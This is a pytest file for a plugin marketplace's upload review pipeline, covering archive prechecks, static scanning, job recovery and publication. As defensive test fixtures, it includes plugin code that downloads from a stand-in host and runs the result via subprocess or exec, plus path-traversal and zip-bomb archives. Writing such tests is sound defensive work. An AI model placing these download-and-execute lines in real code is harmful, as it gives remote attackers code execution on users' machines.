from __future__ import annotations

import asyncio
import io
import json
import stat
import zipfile
from pathlib import Path

import pytest

from app.artifacts.archive import ArchivePrechecker, PrecheckError
from app.artifacts.github_source import GithubSourceClient
from app.artifacts.jobs import ArtifactJobRunner
from app.artifacts.policy_service import ReviewPolicyService
from app.artifacts.repository import InMemoryArtifactRepository
from app.artifacts.service import ArtifactService
from app.artifacts.static_scan import StaticScanner
from app.artifacts.storage import LocalArtifactStorage
from app.config import load_settings
from app.main import format_astrbot_plugin
from app.store import InMemoryMarketStore


def plugin_zip(
    *,
    main_source: str = "print('safe')\n",
    wrapped: bool = False,
    extra_files: dict[str, str] | None = None,
) -> bytes:
    prefix = "astrbot_plugin_demo-commit/" if wrapped else ""
    metadata = "\n".join(
        [
            "name: astrbot_plugin_demo",
            "display_name: Demo",
            "desc: Demo plugin",
            "version: v1.0.0",
            "author: Alice",
            "repo: https://github.com/alice/astrbot_plugin_demo",
            "",
        ]
    )
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.writestr(f"{prefix}metadata.yaml", metadata)
        archive.writestr(f"{prefix}main.py", main_source)
        archive.writestr(f"{prefix}README.md", "# Demo\n")
        for path, content in (extra_files or {}).items():
            archive.writestr(f"{prefix}{path}", content)
    return output.getvalue()


def advanced_policy_payload(astrbot_version: str) -> dict:
    return {
        "schema_version": "1",
        "required_stages": ["static"],
        "runtime_targets": [],
        "limits": {
            "cpu": 1,
            "memory_mb": 768,
            "pids": 128,
            "timeout_seconds": 120,
        },
        "network_profiles": {"install": "pypi-only-v1", "smoke": "none"},
        "llm": {"enabled": False},
        "malware": {"clamav": False},
        "dependency": {"enabled": False},
        "routing": {"auto_approve": False, "manual_review_at": "low"},
    }


async def byte_stream(payload: bytes):
    yield payload[:17]
    yield payload[17:]


def test_precheck_accepts_github_wrapper_and_rejects_path_traversal(tmp_path: Path) -> None:
    settings = load_settings({}).artifacts
    valid_path = tmp_path / "valid.zip"
    valid_path.write_bytes(plugin_zip(wrapped=True))

    result = ArchivePrechecker(settings).inspect(
        valid_path,
        expected_repo="https://github.com/alice/astrbot_plugin_demo",
    )

    assert result.version == "v1.0.0"
    assert result.normalized_version == "1.0.0"
    assert {item.path for item in result.members} == {"README.md", "main.py", "metadata.yaml"}

    malicious_path = tmp_path / "malicious.zip"
    with zipfile.ZipFile(malicious_path, "w") as archive:
        archive.writestr("../metadata.yaml", "name: bad")
    with pytest.raises(PrecheckError, match="路径穿越") as captured:
        ArchivePrechecker(settings).inspect(
            malicious_path,
            expected_repo="https://github.com/alice/astrbot_plugin_demo",
        )
    assert captured.value.code == "path_traversal"


def test_static_scanner_marks_download_and_execute_as_critical(tmp_path: Path) -> None:
    archive_path = tmp_path / "critical.zip"
    archive_path.write_bytes(
        plugin_zip(
            main_source=(
                "import requests\nimport subprocess\n"
                "payload = requests.get('https://example.invalid/payload').content\n"
                "subprocess.run(payload, shell=True)\n"
            )
        )
    )
    result = ArchivePrechecker(load_settings({}).artifacts).inspect(
        archive_path,
        expected_repo="https://github.com/alice/astrbot_plugin_demo",
    )

    findings = StaticScanner().scan(str(archive_path), result.members)

    assert any(item["severity"] == "critical" for item in findings)
    assert StaticScanner.risk_level(findings) == "critical"


def test_precheck_rejects_resource_abuse_and_unsupported_files(tmp_path: Path) -> None:
    too_many = tmp_path / "too-many.zip"
    too_many.write_bytes(plugin_zip())
    limited = load_settings({"ARTIFACT_MAX_FILES": "2"}).artifacts
    with pytest.raises(PrecheckError) as file_count_error:
        ArchivePrechecker(limited).inspect(
            too_many,
            expected_repo="https://github.com/alice/astrbot_plugin_demo",
        )
    assert file_count_error.value.code == "too_many_files"

    native = tmp_path / "native.zip"
    native.write_bytes(plugin_zip(extra_files={"payload.so": "not-a-real-library"}))
    with pytest.raises(PrecheckError) as native_error:
        ArchivePrechecker(load_settings({}).artifacts).inspect(
            native,
            expected_repo="https://github.com/alice/astrbot_plugin_demo",
        )
    assert native_error.value.code == "native_binary_not_supported"

    lfs = tmp_path / "lfs.zip"
    lfs.write_bytes(
        plugin_zip(
            extra_files={
                "model.dat": "version https://git-lfs.github.com/spec/v1\noid sha256:deadbeef\n"
            }
        )
    )
    with pytest.raises(PrecheckError) as lfs_error:
        ArchivePrechecker(load_settings({}).artifacts).inspect(
            lfs,
            expected_repo="https://github.com/alice/astrbot_plugin_demo",
        )
    assert lfs_error.value.code == "git_lfs_not_supported"


def test_precheck_malicious_archive_corpus(tmp_path: Path) -> None:
    metadata = "\n".join(
        [
            "name: astrbot_plugin_demo",
            "display_name: Demo",
            "desc: Demo plugin",
            "version: v1.0.0",
            "author: Alice",
            "repo: https://github.com/alice/astrbot_plugin_demo",
            "",
        ]
    )

    def archive_bytes(
        entries: list[tuple[str, str]], *, symlink: str = "", encrypted: bool = False
    ) -> bytes:
        output = io.BytesIO()
        with zipfile.ZipFile(output, "w", compression=zipfile.ZIP_DEFLATED) as archive:
            for path, content in entries:
                if path == symlink:
                    info = zipfile.ZipInfo(path)
                    info.external_attr = (stat.S_IFLNK | 0o777) << 16
                    archive.writestr(info, content)
                else:
                    archive.writestr(path, content)
        payload = bytearray(output.getvalue())
        if encrypted:
            for signature, flag_offset in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
                position = payload.find(signature)
                assert position >= 0
                flags = int.from_bytes(payload[position + flag_offset : position + flag_offset + 2])
                payload[position + flag_offset : position + flag_offset + 2] = (flags | 1).to_bytes(
                    2, "little"
                )
        return bytes(payload)

    valid_entries = [("metadata.yaml", metadata), ("main.py", "print('safe')\n")]
    cases: list[tuple[str, bytes, dict[str, str], str]] = [
        ("invalid", b"not-a-zip", {}, "invalid_zip"),
        ("empty", archive_bytes([]), {}, "empty_archive"),
        ("metadata-missing", archive_bytes([("main.py", "pass\n")]), {}, "metadata_missing"),
        (
            "entrypoint-missing",
            archive_bytes([("metadata.yaml", metadata)]),
            {},
            "entrypoint_missing",
        ),
        (
            "metadata-ambiguous",
            archive_bytes(valid_entries + [("metadata.yml", metadata)]),
            {},
            "metadata_ambiguous",
        ),
        (
            "required-field",
            archive_bytes(
                [("metadata.yaml", metadata.replace("author: Alice\n", "")), valid_entries[1]]
            ),
            {},
            "metadata_required_field_missing",
        ),
        (
            "invalid-name",
            archive_bytes(
                [
                    ("metadata.yaml", metadata.replace("astrbot_plugin_demo", "Bad Plugin", 1)),
                    valid_entries[1],
                ]
            ),
            {},
            "plugin_name_invalid",
        ),
        (
            "unsafe-version",
            archive_bytes(
                [("metadata.yaml", metadata.replace("v1.0.0", "v1/../../2")), valid_entries[1]]
            ),
            {},
            "version_path_unsafe",
        ),
        (
            "invalid-version",
            archive_bytes(
                [("metadata.yaml", metadata.replace("v1.0.0", "release")), valid_entries[1]]
            ),
            {},
            "version_invalid",
        ),
        (
            "repo-mismatch",
            archive_bytes(
                [
                    (
                        "metadata.yaml",
                        metadata.replace(
                            "alice/astrbot_plugin_demo", "mallory/astrbot_plugin_demo"
                        ),
                    ),
                    valid_entries[1],
                ]
            ),
            {},
            "metadata_repo_mismatch",
        ),
        (
            "yaml-alias",
            archive_bytes(
                [
                    ("metadata.yaml", metadata + "shared: &shared value\nalias: *shared\n"),
                    valid_entries[1],
                ]
            ),
            {},
            "metadata_alias_not_allowed",
        ),
        (
            "yaml-duplicate-key",
            archive_bytes([("metadata.yaml", metadata + "name: duplicate\n"), valid_entries[1]]),
            {},
            "metadata_invalid",
        ),
        (
            "duplicate-casefold-path",
            archive_bytes(valid_entries + [("MAIN.py", "pass\n")]),
            {},
            "duplicate_path",
        ),
        (
            "symlink",
            archive_bytes(valid_entries + [("linked.py", "main.py")], symlink="linked.py"),
            {},
            "symlink_not_allowed",
        ),
        (
            "encrypted",
            archive_bytes(valid_entries, encrypted=True),
            {},
            "encrypted_entry",
        ),
        (
            "submodule",
            archive_bytes(valid_entries + [(".gitmodules", "[submodule 'x']\n")]),
            {},
            "submodule_not_supported",
        ),
        (
            "path-depth",
            archive_bytes(valid_entries + [("a/b/c.py", "pass\n")]),
            {"ARTIFACT_MAX_PATH_DEPTH": "2"},
            "path_too_deep",
        ),
        (
            "file-size",
            archive_bytes(valid_entries + [("large.txt", "x" * 513)]),
            {"ARTIFACT_MAX_FILE_BYTES": "512"},
            "file_too_large",
        ),
        (
            "unpacked-size",
            archive_bytes(valid_entries),
            {"ARTIFACT_MAX_UNPACKED_BYTES": "64"},
            "archive_unpacked_too_large",
        ),
        (
            "compression-ratio",
            archive_bytes(valid_entries + [("zeros.txt", "0" * 5000)]),
            {"ARTIFACT_MAX_COMPRESSION_RATIO": "2"},
            "zip_bomb_suspected",
        ),
    ]

    for name, payload, env, expected_code in cases:
        archive_path = tmp_path / f"{name}.zip"
        archive_path.write_bytes(payload)
        with pytest.raises(PrecheckError) as captured:
            ArchivePrechecker(load_settings(env).artifacts).inspect(
                archive_path,
                expected_repo="https://github.com/alice/astrbot_plugin_demo",
            )
        assert captured.value.code == expected_code, name


def test_static_findings_have_stable_fingerprints_and_lines(tmp_path: Path) -> None:
    archive_path = tmp_path / "rules.zip"
    archive_path.write_bytes(
        plugin_zip(
            main_source="value = 'input'\nresult = eval(value)\n",
            extra_files={
                "requirements.txt": (
                    "demo @ https://user:private@example.invalid/demo.whl?token=secret\n"
                )
            },
        )
    )
    result = ArchivePrechecker(load_settings({}).artifacts).inspect(
        archive_path,
        expected_repo="https://github.com/alice/astrbot_plugin_demo",
    )

    first = StaticScanner().scan(str(archive_path), result.members)
    second = StaticScanner().scan(str(archive_path), result.members)

    assert {item["fingerprint"] for item in first} == {item["fingerprint"] for item in second}
    assert any(item["rule_id"] == "PY001" and item["line_start"] == 2 for item in first)
    assert any(item["rule_id"] == "REQ001" and item["line_start"] == 1 for item in first)
    serialized = json.dumps(first)
    for secret in ("private", "token=secret", "example.invalid"):
        assert secret not in serialized


def test_full_p1_pipeline_publishes_immutable_version_and_gates_feed(tmp_path: Path) -> None:
    async def scenario() -> tuple[dict, dict, dict]:
        settings = load_settings(
            {
                "ARTIFACTS_ENABLED": "true",
                "ARTIFACT_LOCAL_ROOT": str(tmp_path / "storage"),
                "ARTIFACT_CDN_BASE_URL": "https://cdn.example.test",
                "DATABASE_URL": "postgresql://example.invalid/market",
            }
        )
        store = InMemoryMarketStore()
        owner = store.upsert_github_user({"id": "100", "login": "alice", "name": "Alice"})
        plugin = store.register_plugin(
            owner,
            {
                "name": "astrbot_plugin_demo",
                "display_name": "Demo",
                "desc": "Demo plugin",
                "author": "Alice",
                "repo": "https://github.com/alice/astrbot_plugin_demo",
                "tags": [],
                "category": "other",
            },
        )
        plugin = store.update_plugin_metadata(plugin["id"], {"repo_version": "v1.0.0"})
        repository = InMemoryArtifactRepository(store)
        storage = LocalArtifactStorage(
            settings.artifacts.local_root, settings.artifacts.cdn_base_url
        )
        github = GithubSourceClient()
        service = ArtifactService(
            repository=repository,
            storage=storage,
            github=github,
            max_upload_bytes=settings.artifacts.max_upload_bytes,
        )
        runner = ArtifactJobRunner(
            repository=repository,
            storage=storage,
            prechecker=ArchivePrechecker(settings.artifacts),
            scanner=StaticScanner(),
            worker_id="test-worker",
            lease_seconds=60,
            poll_seconds=1,
        )
        try:
            submitted = await service.submit_upload(
                plugin=plugin,
                user=owner,
                stream=byte_stream(plugin_zip()),
            )
            assert await runner.run_once() == 1
            assert await runner.run_once() == 1
            pending = await repository.get_artifact(submitted["id"])
            assert pending and pending["review_status"] == "pending_review"

            await service.approve(
                artifact_id=submitted["id"],
                reviewer={"id": "admin-user", "internal_username": "admin"},
                reason="manual review passed",
                idempotency_key="approve-demo-v1",
            )
            assert await runner.run_once() == 1
            published = await repository.get_artifact(submitted["id"])
            assert published and published["publication_status"] == "published"
            assert published["download_url"].startswith(
                f"https://cdn.example.test/{owner['id']}/astrbot_plugin_demo/v1.0.0/"
            )
            assert published["download_url"].endswith(".zip")

            await repository.enqueue_job(
                {
                    "artifact_id": submitted["id"],
                    "type": "publish",
                    "payload": {"expected_repo_version": "v1.0.0"},
                    "idempotency_key": "recover-published-event",
                }
            )
            assert await runner.run_once() == 1
            published = await repository.get_artifact(submitted["id"])
            assert published and published["publication_status"] == "published"

            await repository.enqueue_job(
                {
                    "artifact_id": submitted["id"],
                    "type": "cleanup_orphan",
                    "payload": {"published_key": published["published_key"]},
                    "idempotency_key": "cleanup-published-object-race",
                }
            )
            assert await runner.run_once() == 1
            assert await storage.stat_published(published["published_key"]) is not None

            current_plugin = store.get_plugin(plugin["id"])
            stable_feed = format_astrbot_plugin(
                {
                    **current_plugin,
                    "_artifact_publication_checked": True,
                    "published_version": published["version"],
                    "artifact_publication_status": published["publication_status"],
                    "artifact_download_url": published["download_url"],
                },
                plugin["name"],
            )
            store.update_plugin_metadata(
                plugin["id"], {"repo_version": "v1.1.0", "version": "v1.1.0"}
            )
            changed_plugin = store.get_plugin(plugin["id"])
            changed_feed = format_astrbot_plugin(
                {
                    **changed_plugin,
                    "_artifact_publication_checked": True,
                    "published_version": published["version"],
                    "artifact_publication_status": published["publication_status"],
                    "artifact_download_url": published["download_url"],
                },
                plugin["name"],
            )
            return stable_feed, changed_feed, published
        finally:
            await service.close()

    stable_feed, changed_feed, published = asyncio.run(scenario())

    assert stable_feed["version"] == "v1.0.0"
    assert stable_feed["download_url"] == published["download_url"]
    assert changed_feed["version"] == "v1.1.0"
    assert changed_feed["repo"] == "https://github.com/alice/astrbot_plugin_demo"
    assert changed_feed["download_url"] == ""


def test_advanced_precheck_fixes_policy_before_active_policy_changes(tmp_path: Path) -> None:
    async def scenario() -> tuple[dict, dict, dict, dict, list[dict], dict]:
        settings = load_settings(
            {
                "ARTIFACTS_ENABLED": "true",
                "ARTIFACT_LOCAL_ROOT": str(tmp_path / "policy-storage"),
                "ARTIFACT_CDN_BASE_URL": "https://cdn.example.test",
                "DATABASE_URL": "postgresql://example.invalid/market",
            }
        )
        store = InMemoryMarketStore()
        owner = store.upsert_github_user({"id": "100", "login": "alice", "name": "Alice"})
        plugin = store.register_plugin(
            owner,
            {
                "name": "astrbot_plugin_demo",
                "display_name": "Demo",
                "desc": "Demo plugin",
                "author": "Alice",
                "repo": "https://github.com/alice/astrbot_plugin_demo",
                "tags": [],
                "category": "other",
            },
        )
        repository = InMemoryArtifactRepository(store)
        storage = LocalArtifactStorage(
            settings.artifacts.local_root,
            settings.artifacts.cdn_base_url,
        )
        artifact_service = ArtifactService(
            repository=repository,
            storage=storage,
            github=GithubSourceClient(),
            max_upload_bytes=settings.artifacts.max_upload_bytes,
        )
        policy_service = ReviewPolicyService(repository)
        actor = {"id": "core", "role": "core_admin", "username": "core"}

        async def activate_policy(version: str, astrbot_version: str, index: int) -> dict:
            draft = await policy_service.create_draft(
                version=version,
                policy=advanced_policy_payload(astrbot_version),
                actor=actor,
                request_id=f"pipeline-policy-create-{index}",
                idempotency_key=f"pipeline-policy-create-{index}",
            )
            return await policy_service.activate(
                draft["id"],
                actor=actor,
                request_id=f"pipeline-policy-activate-{index}",
                idempotency_key=f"pipeline-policy-activate-{index}",
                reason=f"Activate pipeline policy {index}",
            )

        await activate_policy("pipeline-policy-1", "4.26.5", 1)
        runner = ArtifactJobRunner(
            repository=repository,
            storage=storage,
            prechecker=ArchivePrechecker(settings.artifacts),
            scanner=StaticScanner(),
            worker_id="policy-worker",
            lease_seconds=60,
            poll_seconds=1,
            advanced_review_enabled=True,
        )
        try:
            submitted = await artifact_service.submit_upload(
                plugin=plugin,
                user=owner,
                stream=byte_stream(plugin_zip()),
            )
            assert await runner.run_once() == 1
            after_precheck = await repository.get_artifact(submitted["id"])
            assert after_precheck
            static_job = next(
                job for job in repository.jobs.values() if job["type"] == "static_scan"
            )

            second_policy = await activate_policy("pipeline-policy-2", "4.27.0", 2)
            assert await runner.run_once() == 1
            after_static = await repository.get_artifact(submitted["id"])
            assert after_static
            route_job = next(
                job for job in repository.jobs.values() if job["type"] == "route_review"
            )
            assert await runner.run_once() == 1
            pending = await repository.get_artifact(submitted["id"])
            assert pending
            return (
                after_static,
                pending,
                static_job,
                route_job,
                await repository.list_review_runs(submitted["id"]),
                second_policy,
            )
        finally:
            await artifact_service.close()

    after_static, artifact, static_job, route_job, runs, active_policy = asyncio.run(scenario())

    assert after_static["review_status"] == "scanning"
    assert artifact["review_status"] == "pending_review"
    assert artifact["policy_version_id"] == static_job["policy_version_id"]
    assert artifact["policy_version_id"] == route_job["policy_version_id"]
    assert {run["policy_version_id"] for run in runs} == {artifact["policy_version_id"]}
    assert artifact["policy_version_id"] != active_policy["id"]


def test_advanced_static_critical_rejects_without_routing(tmp_path: Path) -> None:
    async def scenario() -> tuple[dict, list[dict], list[dict], list[dict]]:
        settings = load_settings(
            {
                "ARTIFACTS_ENABLED": "true",
                "ARTIFACT_LOCAL_ROOT": str(tmp_path / "critical-storage"),
                "ARTIFACT_CDN_BASE_URL": "https://cdn.example.test",
                "DATABASE_URL": "postgresql://example.invalid/market",
            }
        )
        store = InMemoryMarketStore()
        owner = store.upsert_github_user({"id": "100", "login": "alice", "name": "Alice"})
        plugin = store.register_plugin(
            owner,
            {
                "name": "astrbot_plugin_demo",
                "display_name": "Demo",
                "desc": "Demo plugin",
                "author": "Alice",
                "repo": "https://github.com/alice/astrbot_plugin_demo",
                "tags": [],
                "category": "other",
            },
        )
        repository = InMemoryArtifactRepository(store)
        storage = LocalArtifactStorage(
            settings.artifacts.local_root,
            settings.artifacts.cdn_base_url,
        )
        service = ArtifactService(
            repository=repository,
            storage=storage,
            github=GithubSourceClient(),
            max_upload_bytes=settings.artifacts.max_upload_bytes,
        )
        policy_service = ReviewPolicyService(repository)
        actor = {"id": "core", "role": "core_admin", "username": "core"}
        draft = await policy_service.create_draft(
            version="critical-static-policy",
            policy=advanced_policy_payload("4.26.5"),
            actor=actor,
            request_id="critical-static-create",
            idempotency_key="critical-static-create",
        )
        await policy_service.activate(
            draft["id"],
            actor=actor,
            request_id="critical-static-activate",
            idempotency_key="critical-static-activate",
            reason="Activate critical static test policy",
        )
        runner = ArtifactJobRunner(
            repository=repository,
            storage=storage,
            prechecker=ArchivePrechecker(settings.artifacts),
            scanner=StaticScanner(),
            worker_id="critical-static-worker",
            lease_seconds=60,
            poll_seconds=1,
            advanced_review_enabled=True,
        )
        try:
            submitted = await service.submit_upload(
                plugin=plugin,
                user=owner,
                stream=byte_stream(
                    plugin_zip(
                        main_source=(
                            "import requests\n"
                            "payload = requests.get('https://example.invalid/payload').text\n"
                            "exec(payload)\n"
                        )
                    )
                ),
            )
            assert await runner.run_once() == 1
            assert await runner.run_once() == 1
            artifact = await repository.get_artifact(submitted["id"])
            assert artifact is not None
            return (
                artifact,
                await repository.list_artifact_jobs(submitted["id"]),
                await repository.list_review_runs(submitted["id"]),
                await repository.list_review_decisions(submitted["id"]),
            )
        finally:
            await service.close()

    artifact, jobs, runs, decisions = asyncio.run(scenario())

    static_run = next(run for run in runs if run["type"] == "static")
    assert artifact["review_status"] == "rejected"
    assert artifact["rejection_code"] == "critical_static_finding"
    assert static_run["status"] == "succeeded"
    assert static_run["coverage"]["outcome"] == "blocked"
    assert not any(job["type"] == "route_review" for job in jobs)
    assert decisions[-1]["action"] == "auto_reject"


def test_terminal_precheck_failure_closes_run_and_marks_processing_failed(tmp_path: Path) -> None:
    async def scenario() -> tuple[dict, list[dict], list[dict]]:
        settings = load_settings(
            {
                "ARTIFACTS_ENABLED": "true",
                "ARTIFACT_LOCAL_ROOT": str(tmp_path / "storage"),
                "ARTIFACT_CDN_BASE_URL": "https://cdn.example.test",
                "DATABASE_URL": "postgresql://example.invalid/market",
            }
        )
        store = InMemoryMarketStore()
        owner = store.upsert_github_user({"id": "100", "login": "alice", "name": "Alice"})
        plugin = store.register_plugin(
            owner,
            {
                "name": "astrbot_plugin_demo",
                "display_name": "Demo",
                "desc": "Demo plugin",
                "author": "Alice",
                "repo": "https://github.com/alice/astrbot_plugin_demo",
                "tags": [],
            },
        )
        repository = InMemoryArtifactRepository(store)
        storage = LocalArtifactStorage(
            settings.artifacts.local_root, settings.artifacts.cdn_base_url
        )
        service = ArtifactService(
            repository=repository,
            storage=storage,
            github=GithubSourceClient(),
            max_upload_bytes=settings.artifacts.max_upload_bytes,
        )
        runner = ArtifactJobRunner(
            repository=repository,
            storage=storage,
            prechecker=ArchivePrechecker(settings.artifacts),
            scanner=StaticScanner(),
            worker_id="failure-worker",
            lease_seconds=60,
            poll_seconds=1,
        )
        try:
            submitted = await service.submit_upload(
                plugin=plugin,
                user=owner,
                stream=byte_stream(plugin_zip()),
            )
            artifact = await repository.get_artifact(submitted["id"])
            assert artifact
            target = storage.quarantine_root / str(artifact["quarantine_key"])
            target.write_bytes(b"tampered")
            await runner.run_once()
            return (
                await repository.get_artifact(submitted["id"]),
                await repository.list_review_runs(submitted["id"]),
                list(repository.jobs.values()),
            )
        finally:
            await service.close()

    artifact, runs, jobs = asyncio.run(scenario())

    assert artifact["review_status"] == "processing_failed"
    assert runs[-1]["status"] == "failed"
    assert jobs[0]["status"] == "failed"


def test_p1_precheck_and_static_recover_lost_worker_leases(tmp_path: Path) -> None:
    async def scenario() -> tuple[dict, list[dict], list[dict]]:
        settings = load_settings(
            {
                "ARTIFACTS_ENABLED": "true",
                "ARTIFACT_LOCAL_ROOT": str(tmp_path / "lease-recovery-storage"),
                "ARTIFACT_CDN_BASE_URL": "https://cdn.example.test",
                "DATABASE_URL": "postgresql://example.invalid/market",
            }
        )
        store = InMemoryMarketStore()
        owner = store.upsert_github_user({"id": "100", "login": "alice", "name": "Alice"})
        plugin = store.register_plugin(
            owner,
            {
                "name": "astrbot_plugin_demo",
                "display_name": "Demo",
                "desc": "Demo plugin",
                "author": "Alice",
                "repo": "https://github.com/alice/astrbot_plugin_demo",
                "tags": [],
            },
        )
        repository = InMemoryArtifactRepository(store)
        storage = LocalArtifactStorage(
            settings.artifacts.local_root,
            settings.artifacts.cdn_base_url,
        )
        service = ArtifactService(
            repository=repository,
            storage=storage,
            github=GithubSourceClient(),
            max_upload_bytes=settings.artifacts.max_upload_bytes,
        )
        runner = ArtifactJobRunner(
            repository=repository,
            storage=storage,
            prechecker=ArchivePrechecker(settings.artifacts),
            scanner=StaticScanner(),
            worker_id="lease-recovery-worker",
            lease_seconds=60,
            poll_seconds=1,
        )
        try:
            submitted = await service.submit_upload(
                plugin=plugin,
                user=owner,
                stream=byte_stream(plugin_zip()),
            )
            precheck_job = (await repository.claim_jobs("crashed-precheck-worker", 1, 60))[0]
            await repository.transition_review_status(submitted["id"], "prechecking")
            repository.jobs[precheck_job["id"]]["lease_expires_at"] = "2000-01-01T00:00:00+00:00"
            assert await runner.run_once() == 1

            static_job = (await repository.claim_jobs("lost-static-ack-worker", 1, 60))[0]
            assert static_job["type"] == "static_scan"
            await runner._run_review_stage(static_job)
            repository.jobs[static_job["id"]]["lease_expires_at"] = "2000-01-01T00:00:00+00:00"
            assert await runner.run_once() == 1
            artifact = await repository.get_artifact(submitted["id"])
            assert artifact is not None
            return (
                artifact,
                await repository.list_review_runs(submitted["id"]),
                await repository.list_artifact_jobs(submitted["id"]),
            )
        finally:
            await service.close()

    artifact, runs, jobs = asyncio.run(scenario())

    precheck_runs = [run for run in runs if run["type"] == "precheck"]
    static_runs = [run for run in runs if run["type"] == "static"]
    precheck_job = next(job for job in jobs if job["type"] == "precheck")
    static_job = next(job for job in jobs if job["type"] == "static_scan")
    assert artifact["review_status"] == "pending_review"
    assert [(run["attempt"], run["status"]) for run in precheck_runs] == [(2, "succeeded")]
    assert [(run["attempt"], run["status"]) for run in static_runs] == [(1, "succeeded")]
    assert precheck_job["attempts"] == 2 and precheck_job["status"] == "succeeded"
    assert static_job["attempts"] == 2 and static_job["status"] == "succeeded"


def test_object_success_database_failure_never_exposes_release(tmp_path: Path) -> None:
    async def scenario() -> tuple[dict, dict, int, int]:
        settings = load_settings(
            {
                "ARTIFACTS_ENABLED": "true",
                "ARTIFACT_LOCAL_ROOT": str(tmp_path / "storage"),
                "ARTIFACT_CDN_BASE_URL": "https://cdn.example.test",
                "DATABASE_URL": "postgresql://example.invalid/market",
            }
        )
        store = InMemoryMarketStore()
        owner = store.upsert_github_user({"id": "100", "login": "alice", "name": "Alice"})
        plugin = store.register_plugin(
            owner,
            {
                "name": "astrbot_plugin_demo",
                "display_name": "Demo",
                "desc": "Demo plugin",
                "author": "Alice",
                "repo": "https://github.com/alice/astrbot_plugin_demo",
                "tags": [],
            },
        )
        plugin = store.update_plugin_metadata(plugin["id"], {"repo_version": "v1.0.0"})
        repository = InMemoryArtifactRepository(store)
        storage = LocalArtifactStorage(
            settings.artifacts.local_root, settings.artifacts.cdn_base_url
        )
        service = ArtifactService(
            repository=repository,
            storage=storage,
            github=GithubSourceClient(),
            max_upload_bytes=settings.artifacts.max_upload_bytes,
        )
        runner = ArtifactJobRunner(
            repository=repository,
            storage=storage,
            prechecker=ArchivePrechecker(settings.artifacts),
            scanner=StaticScanner(),
            worker_id="publish-failure-worker",
            lease_seconds=60,
            poll_seconds=1,
        )
        try:
            submitted = await service.submit_upload(
                plugin=plugin,
                user=owner,
                stream=byte_stream(plugin_zip()),
            )
            await runner.run_once()
            await runner.run_once()
            await service.approve(
                artifact_id=submitted["id"],
                reviewer={"id": "admin", "internal_username": "admin"},
                reason="passed",
                idempotency_key="approve-before-db-failure",
            )

            async def fail_publish(*args: object, **kwargs: object) -> dict:
                raise RuntimeError("database commit unavailable")

            repository.publish_artifact = fail_publish  # type: ignore[method-assign]
            await runner.run_once()
            before_cleanup = len(list(storage.published_root.rglob("*.zip")))
            await runner.run_once()
            after_cleanup = len(list(storage.published_root.rglob("*.zip")))
            return (
                await repository.get_artifact(submitted["id"]),
                store.get_plugin(plugin["id"]),
                before_cleanup,
                after_cleanup,
            )
        finally:
            await service.close()

    artifact, plugin, before_cleanup, after_cleanup = asyncio.run(scenario())

    assert artifact["publication_status"] == "publish_failed"
    assert plugin.get("current_artifact_id") in {None, ""}
    assert before_cleanup == 1
    assert after_cleanup == 0
